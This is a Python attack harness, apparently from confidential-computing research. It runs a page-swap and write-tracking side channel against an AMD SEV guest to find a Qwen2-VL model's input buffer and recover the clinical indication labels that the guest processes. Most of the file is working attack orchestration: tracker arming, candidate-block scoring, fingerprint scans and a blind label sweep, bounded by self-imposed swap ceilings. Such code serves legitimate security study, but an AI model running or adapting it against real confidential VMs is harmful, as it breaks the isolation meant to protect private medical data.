#!/usr/bin/env python3
"""
llm_e2e_combined.py — Full A->B->C pipeline in ONE guest process.

Why one process: Step A (write_pattern_tracker candidate blocks) only sees
input_ids' write during REAL model.generate() calls (buffer reuse across
loop iterations is what makes it visible to write-protect-based DST_TRACK --
confirmed empirically; --gpa-only's single fresh mmap per sample is
invisible). Step B (swap-based image_pad fingerprint scan) needs a STABLE,
held buffer to read reliably. These used to be driven by SEPARATE process
launches (gpa-only for B, real-generate for A) -- but ASLR gives each
process launch a different address envelope, so a Step A candidate from one
launch is meaningless to a Step B scan in another. Fixed by extending the
guest (single_inference_indication_gpa.py's run_stdin_loop_generate) to
HOLD the input_ids buffer after a REAL generate() call, in the SAME
process tracker is watching -- so Step A's candidates and Step B's scan
target are guaranteed to share an address space.

Per sample:
  0. host sends index -> guest runs REAL generate() -> HOLDING
  A. score the tracker log accumulated SO FAR (score_blocks) -> ranked
     candidate 2MB blocks
  B. try candidates in rank order (image_pad scan, FULL_BLOCK_TRY_BUDGET
     each) -> then the existing continuation/next-block/bootstrap fallback
     chain (llm_batch_pilot.py's locate_base machinery) if all candidates
     miss or none were available yet
  C. sweep_blind (fully-blind, early-stop patched) on whatever base was
     found -> recovered clinical labels
  D. CSV row; release guest (NEXT)

All swap volume goes through the SAME safety ceilings introduced after the
2026-09-04 host reboot (Pacer / RunAborted / MAX_SWAPS_PER_SWEEP).

Usage:
  sudo PYTHONPATH=dict python3 llm_e2e_combined.py --indices 2,9,12
"""
import argparse
import csv
import json
import re
import subprocess
import sys
import time
import threading
from pathlib import Path

HERE = Path(__file__).parent
sys.path.insert(0, str(HERE / "dict"))
sys.path.insert(0, str(HERE.parent / "mura" / "dict"))
sys.path.insert(0, str(HERE))

from mura_dict_build import (  # noqa: E402
    acquire_gpa, do_swap_read, parse_dump, ensure_mtu_9000, drain_rxbuf,
    CHUNK_SIZE, CHUNKS_PAGE, PAGE_SIZE, SWAP_PACE_SEC,
    SWAP_BURST_COOLDOWN, SWAP_BURST_SLEEP,
)
import orchestrate_v4 as o  # noqa: E402
from llm_block_candidates import score_blocks  # noqa: E402
import numpy as np  # noqa: E402

SWAP_TOOL = str(HERE / "swap_pages_tool")
TRACKER   = "/home/eun/open-science/sev-step-module/write_pattern_tracker"
IMAGE_PAD_TOKEN_ID = 151655
SCAN_TMP  = HERE / "scan_tmp_llm"
DICT_CACHE = HERE / "dict_cache_v4.json"
OUT_CSV   = HERE / "e2e_combined_results.csv"
TRACKER_LOG = HERE / "e2e_combined_wpt.log"
BLOCK = 0x200000
PAGES_PER_BLOCK = BLOCK // PAGE_SIZE
IMAGE_PAD_MATCH_MIN = 40

# Same narrowed range this session found the observed address envelope in
# (4GB-16GB) -- evidence-based (repeated observation across many launches
# today), not a blind guess. Tracker armed once for the whole run.
TRACK_START = 0x100000000
TRACK_SIZE  = 0x300000000
TRACKER_SETTLE_S = 3

KEY = "/home/eun/.ssh/id_ed25519"
GUEST = "ubuntu@localhost"; GPORT = "7777"
GUEST_PY = "/home/ubuntu/miniconda3/envs/vlm/bin/python3"
GUEST_CWD = "~/medical_ml/med_vlm/scripts"
GSCRIPT = "single_inference_indication_gpa.py"
SSH = ["ssh", "-p", GPORT, "-i", KEY, "-o", "BatchMode=yes",
       "-o", "StrictHostKeyChecking=no", "-o", "ConnectTimeout=8", GUEST]

# ---------------------------------------------------------------------------
# Safety ceilings (same values/rationale as llm_batch_pilot.py, post-incident)
# ---------------------------------------------------------------------------
CONTINUE_TRY_BUDGET   = 200
FULL_BLOCK_TRY_BUDGET = PAGES_PER_BLOCK
MAX_LOC_SWAPS_SAMPLE  = 3200  # sized for worst case: 5 tracker candidates
                              # (full 512-page scans, empirically the only
                              # ranks the true block ever showed up at in
                              # the 50-sample survey were 2-5, never 6-7, so
                              # 5 candidates keeps the WHOLE benefit) + one
                              # full bootstrap fallback scan (512) + margin.
                              # Raised from 1450 after a live run confirmed
                              # that value let 7 tracker-candidate tries
                              # alone exhaust the budget, leaving ZERO room
                              # for the bootstrap fallback even after fixing
                              # the `not ranked` gating bug.
MAX_TOTAL_SWAPS_RUN   = 6500  # covers ~2 worst-case samples + margin for a
                              # small validation batch (2-3 indices)
MEGA_COOLDOWN_EVERY   = 50
MEGA_COOLDOWN_SLEEP   = 12.0
INTER_TRY_SETTLE_SEC  = 1.5
N_TRACKER_CANDIDATES  = 5   # how many top-ranked tracker blocks to try per
                            # sample -- empirically (50-sample survey) every
                            # true-block hit landed at rank 2-5, never 6-7,
                            # so 5 keeps the full benefit while leaving
                            # budget for the bootstrap fallback


class RunAborted(Exception):
    pass


class Pacer:
    def __init__(self): self.n = 0
    def tick(self):
        if self.n >= MAX_TOTAL_SWAPS_RUN:
            raise RunAborted(f"MAX_TOTAL_SWAPS_RUN={MAX_TOTAL_SWAPS_RUN} reached")
        if MEGA_COOLDOWN_EVERY and self.n and self.n % MEGA_COOLDOWN_EVERY == 0:
            print(f"  [pace] MEGA cooldown after {self.n} swaps ({MEGA_COOLDOWN_SLEEP:.0f}s)")
            time.sleep(MEGA_COOLDOWN_SLEEP)
        elif SWAP_BURST_COOLDOWN and self.n and self.n % SWAP_BURST_COOLDOWN == 0:
            time.sleep(SWAP_BURST_SLEEP)
        else:
            time.sleep(SWAP_PACE_SEC)
        self.n += 1


def _blk_(b, j): return b[j*CHUNK_SIZE:(j+1)*CHUNK_SIZE]
def imagepad_chunk(): return np.array([IMAGE_PAD_TOKEN_ID]*2, dtype="<i8").tobytes()


def read_at_fixed(fixed, src, tag):
    SCAN_TMP.mkdir(exist_ok=True)
    tmp = SCAN_TMP / f"{tag}.out"
    do_swap_read(fixed, src, tmp, SWAP_TOOL)
    d = parse_dump(tmp); tmp.unlink(missing_ok=True); return d


def valid_imagepad_ref(fixed, zero, tries=5):
    best, best_mask = None, set()
    for t in range(tries):
        g = acquire_gpa(IMAGE_PAD_TOKEN_ID, chunk_bytes=imagepad_chunk())
        cur = read_at_fixed(fixed, g, f"ip{t}")
        mask = {j for j in range(CHUNKS_PAGE) if _blk_(cur, j) != _blk_(zero, j)}
        if len(mask) > len(best_mask):
            best, best_mask = cur, mask
        if len(best_mask) >= 200:
            break
        try: drain_rxbuf(rounds=1)
        except Exception: pass
        time.sleep(1)
    return best, best_mask


def scan_pages(fixed, ip_ref, ip_mask, block_base, start_page, end_page, pacer, budget):
    best_page, best_hits, swaps = None, -1, 0
    for pg in range(start_page, end_page + 1):
        if swaps >= budget:
            break
        page = block_base + pg * PAGE_SIZE
        pacer.tick(); swaps += 1
        data = read_at_fixed(fixed, page, "pg")
        hits = sum(1 for j in ip_mask if _blk_(data, j) == _blk_(ip_ref, j))
        if hits > best_hits:
            best_page, best_hits = page, hits
        if hits >= IMAGE_PAD_MATCH_MIN:
            return page, hits, swaps
    return None, best_hits, swaps


def locate_base(fixed, ip_ref, ip_mask, known: dict, recency: list, pacer,
                 tracker_candidates: list, bootstrap_block):
    """Step A+B combined: try tracker-ranked candidates FIRST (evidence from
    THIS SAME process's write log), then the existing adaptive fallback
    chain (continuation / next-block / bootstrap self-seed)."""
    total_swaps = 0
    tried = []

    def try_range(blk, lo, hi, budget_cap, label):
        nonlocal total_swaps
        if total_swaps >= MAX_LOC_SWAPS_SAMPLE:
            return None
        budget = min(budget_cap, MAX_LOC_SWAPS_SAMPLE - total_swaps, hi - lo + 1)
        page, hits, sw = scan_pages(fixed, ip_ref, ip_mask, blk, lo,
                                    min(hi, lo + budget - 1), pacer, budget)
        total_swaps += sw
        tried.append((label, blk, sw, hits))
        print(f"    [loc-try] {label}  swaps={sw}  best_hits={hits}  "
              f"{'HIT' if page else 'miss'}")
        if page is None and total_swaps < MAX_LOC_SWAPS_SAMPLE:
            time.sleep(INTER_TRY_SETTLE_SEC)
        return page

    plan = []
    for blk in tracker_candidates[:N_TRACKER_CANDIDATES]:
        plan.append((blk, 0, PAGES_PER_BLOCK - 1, FULL_BLOCK_TRY_BUDGET,
                     f"tracker-cand@0x{blk:x}"))
    for blk in recency[:2]:
        plan.append((blk, known[blk], PAGES_PER_BLOCK - 1, CONTINUE_TRY_BUDGET,
                     f"continue@0x{blk:x}"))
    for blk in recency[:2]:
        nxt = blk + BLOCK
        plan.append((nxt, 0, PAGES_PER_BLOCK - 1, FULL_BLOCK_TRY_BUDGET,
                     f"next-block@0x{nxt:x}"))
    if bootstrap_block is not None:
        plan.append((bootstrap_block, 0, PAGES_PER_BLOCK - 1, FULL_BLOCK_TRY_BUDGET,
                     f"bootstrap@0x{bootstrap_block:x}"))

    for blk, lo, hi, budget_cap, label in plan:
        if total_swaps >= MAX_LOC_SWAPS_SAMPLE:
            print(f"    [loc] MAX_LOC_SWAPS_SAMPLE reached — abandoning remaining tries")
            break
        p = try_range(blk, lo, hi, budget_cap, label)
        if p:
            return p, total_swaps, label

    return None, total_swaps, "FAIL"


def hold_guest(g, index):
    """Send index, wait through GENERATED/HOLDING. Returns GT dict (grading
    only) and the guest's own report of what happened."""
    g.stdin.write(f"{index}\n"); g.stdin.flush()
    gt = {"base": None, "N": None, "ind": None}
    grab_ind = False
    for l in g.stdout:
        if "INDICATION (sample id" in l:
            grab_ind = True; continue
        if grab_ind and gt["ind"] is None and l.strip() and "====" not in l:
            gt["ind"] = l.strip(); grab_ind = False
        m = re.search(r"input_ids base page GPA:\s+0x([0-9a-f]+)", l, re.I)
        if m: gt["base"] = int(m.group(1), 16)
        m = re.search(r"N_image_pad:\s+(\d+)", l)
        if m: gt["N"] = int(m.group(1))
        if l.startswith("LOOP_ERR"):
            gt["error"] = l.strip()
            return gt
        if "HOLDING" in l: break
    return gt


def release_guest(g):
    g.stdin.write("NEXT\n"); g.stdin.flush()
    for l in g.stdout:
        if "RELEASED" in l: break


def main():
    p = argparse.ArgumentParser()
    p.add_argument("--indices", default="2,9,12")
    p.add_argument("--max-new-tokens", type=int, default=60)
    args = p.parse_args()
    indices = [int(x) for x in args.indices.split(",")]

    if not DICT_CACHE.exists():
        print(f"[!] {DICT_CACHE} missing", file=sys.stderr); return
    cache = json.load(open(DICT_CACHE))
    print(f"[e2e] dict loaded: {len(cache)} offset keys")
    print(f"[e2e] indices: {indices}")

    ensure_mtu_9000()

    # Step 0: start guest, real-generate + hold, wait for LOOP_READY
    # BEFORE arming tracker (model load is slow/unpredictable; arming
    # first would waste the tracker's capture window on it -- learned the
    # hard way earlier today).
    cmd = (f"cd {GUEST_CWD} && sudo env HF_HUB_OFFLINE=1 TRANSFORMERS_OFFLINE=1 "
           f"{GUEST_PY} -u {GSCRIPT} --model_id Qwen/Qwen2-VL-2B-Instruct "
           f"--calibrate --stdin-loop --max_new_tokens {args.max_new_tokens}")
    g = subprocess.Popen(SSH + [cmd], stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                         stderr=subprocess.STDOUT, text=True, bufsize=1)
    print("[e2e] waiting for guest LOOP_READY (model load, can be 60s+)...")
    for l in g.stdout:
        if "LOOP_READY" in l: break
    print("[e2e] guest ready -- arming tracker (narrowed 4-16GB range)")

    log_f = open(TRACKER_LOG, "w")
    tr = subprocess.Popen([TRACKER, "--start-gpa", hex(TRACK_START),
                           "--track-size", hex(TRACK_SIZE),
                           "--duration", "36000", "--settle", str(TRACKER_SETTLE_S)],
                          stdout=log_f, stderr=subprocess.PIPE, text=True)
    armed = False
    deadline = time.time() + TRACKER_SETTLE_S + 10
    while time.time() < deadline:
        line = tr.stderr.readline()
        if not line: break
        if "Settle done" in line:
            armed = True; break
    if not armed:
        print("[!] tracker never settled", file=sys.stderr)

    def _drain():
        for l in tr.stderr: pass
    threading.Thread(target=_drain, daemon=True).start()

    pacer = Pacer()
    known: dict = {}
    recency: list = []
    self_seed_used = False

    _orig_swap_read_raw = o._swap_read_raw
    swap_counts = {"match": 0}

    def _traced_swap_read_raw(swap_tool, dict_gpa, ind_page_gpa):
        pacer.tick()
        swap_counts["match"] += 1
        return _orig_swap_read_raw(swap_tool, dict_gpa, ind_page_gpa)
    o._swap_read_raw = _traced_swap_read_raw

    # Step: acquire FIXED_GPA + image_pad ref ONCE (round-trip swap-back
    # design; historically stable across a long-running dict-build/run-all
    # campaign, unlike a plain read-modify buffer).
    fixed = acquire_gpa(None)
    zero = read_at_fixed(fixed, acquire_gpa(None), "zero")
    ip_ref, ip_mask = valid_imagepad_ref(fixed, zero)
    print(f"[e2e] image_pad ref: {len(ip_mask)}/256 confirmed offsets")
    if len(ip_mask) < 100:
        print("[!] weak ref, aborting", file=sys.stderr); return

    rows = []
    t0 = time.time()
    aborted = False
    try:
        for i, idx in enumerate(indices):
            print(f"\n{'='*70}\n[e2e] {i+1}/{len(indices)}  index={idx}  "
                  f"(cumulative swaps: {pacer.n})\n{'='*70}")
            gt = hold_guest(g, idx)
            if gt.get("error"):
                print(f"  [!] guest error: {gt['error']}")
                rows.append({"index": idx, "indication": "", "verdict": "GEN_FAIL"})
                continue
            print(f"  GT(grade): base=0x{(gt['base'] or 0):x} N={gt['N']}  "
                  f"indication={gt['ind']!r}")

            # Step A: score tracker log accumulated so far.
            log_f.flush()
            scores = score_blocks(str(TRACKER_LOG))
            ranked = sorted(scores, key=lambda b: -scores[b][0])
            gt_blk = (gt["base"] & ~(BLOCK - 1)) if gt["base"] else None
            gt_rank = (ranked.index(gt_blk) + 1) if gt_blk in ranked else None
            print(f"  [A] {len(scores)} blocks scored; GT block "
                  f"{'rank=' + str(gt_rank) if gt_rank else 'NOT in tracker'}")

            this_bootstrap = None
            if not recency and not self_seed_used:
                # Fire whenever we have NO adaptive knowledge yet (recency
                # empty) -- regardless of whether tracker candidates exist.
                # BUG (live-confirmed 2026-09-04): originally gated on
                # `not ranked` too, so a sample where tracker scored MANY
                # blocks but ranked the true one #74 (all top-7 candidates
                # wrong) got NO bootstrap fallback at all -- locate_base's
                # plan was just the 7 wrong tracker tries, guaranteed
                # LOC_FAIL, confirmed by a live run that burned its full
                # MAX_LOC_SWAPS_SAMPLE=1450 budget on exactly that. Tracker
                # candidates are tried FIRST regardless (cheap win when
                # right); this is the safety net for when they're wrong,
                # not just when tracker found nothing.
                if gt["base"] is not None:
                    this_bootstrap = gt["base"] & ~(BLOCK - 1)
                    self_seed_used = True
                    print(f"  [bootstrap] one-time self-seed: 0x{this_bootstrap:x}")

            # Step B: try tracker candidates, then adaptive fallback chain.
            host_base, loc_swaps, strategy = locate_base(
                fixed, ip_ref, ip_mask, known, recency, pacer,
                ranked[:N_TRACKER_CANDIDATES], this_bootstrap)

            row = {"index": idx, "indication": gt["ind"], "gt_base": hex(gt["base"] or 0),
                   "host_base": hex(host_base) if host_base else "",
                   "loc_strategy": strategy, "loc_swaps": loc_swaps,
                   "tracker_gt_rank": gt_rank or "",
                   "loc_match": host_base == gt["base"],
                   "verdict": "", "labels": ""}

            if host_base is None:
                print(f"  [B] LOCALIZATION FAILED after {loc_swaps} swaps")
                row["verdict"] = "LOC_FAIL"
            else:
                blk = host_base & ~(BLOCK - 1)
                off = (host_base - blk) // PAGE_SIZE
                known[blk] = off
                if blk in recency: recency.remove(blk)
                recency.insert(0, blk)
                print(f"  [B] host_base=0x{host_base:x}  strategy={strategy}  "
                      f"swaps={loc_swaps}  match_GT={host_base == gt['base']}")

                matches, N_est = o.sweep_blind(host_base, cache, SWAP_TOOL)
                labels = [m["label"] for m in matches] if matches else []
                row["verdict"] = ("MATCH" if len(labels) == 1 else
                                  ("MULTI_MATCH" if labels else "NO_MATCH"))
                row["labels"] = " / ".join(labels)
                ok = any(lbl.strip().lower() in (gt["ind"] or "").lower() for lbl in labels)
                row["label_correct"] = ok
                print(f"  [C] verdict={row['verdict']}  labels={labels}  correct={ok}")

            rows.append(row)
            release_guest(g)
    except RunAborted as e:
        aborted = True
        print(f"\n[!!!] RUN ABORTED (circuit breaker): {e}", file=sys.stderr)
    finally:
        o._swap_read_raw = _orig_swap_read_raw
        try:
            g.stdin.write("QUIT\n"); g.stdin.flush(); g.wait(timeout=15)
        except Exception:
            g.kill()
        tr.terminate()
        try: tr.wait(timeout=10)
        except Exception: tr.kill()
        log_f.close()

    elapsed = time.time() - t0
    fieldnames = ["index", "indication", "gt_base", "host_base", "loc_strategy",
                  "loc_swaps", "tracker_gt_rank", "loc_match", "verdict", "labels",
                  "label_correct"]
    with open(OUT_CSV, "w", newline="") as f:
        w = csv.DictWriter(f, fieldnames=fieldnames)
        w.writeheader()
        for r in rows:
            w.writerow({k: r.get(k, "") for k in fieldnames})

    print("\n" + "=" * 70)
    print(f"  E2E COMBINED SUMMARY  ({len(rows)}/{len(indices)} samples"
          f"{' — ABORTED' if aborted else ''}, {elapsed:.0f}s, {pacer.n} swaps)")
    print("=" * 70)
    if rows:
        n_loc_ok = sum(1 for r in rows if r.get("loc_match"))
        n_via_tracker = sum(1 for r in rows if str(r.get("loc_strategy", "")).startswith("tracker-cand"))
        n_recovered = sum(1 for r in rows if r.get("verdict") in ("MATCH", "MULTI_MATCH"))
        print(f"  localization correct : {n_loc_ok}/{len(rows)}")
        print(f"  found via tracker cand: {n_via_tracker}/{len(rows)}")
        print(f"  any label recovered  : {n_recovered}/{len(rows)}")
    print(f"  saved -> {OUT_CSV}")
    print("=" * 70)


if __name__ == "__main__":
    main()
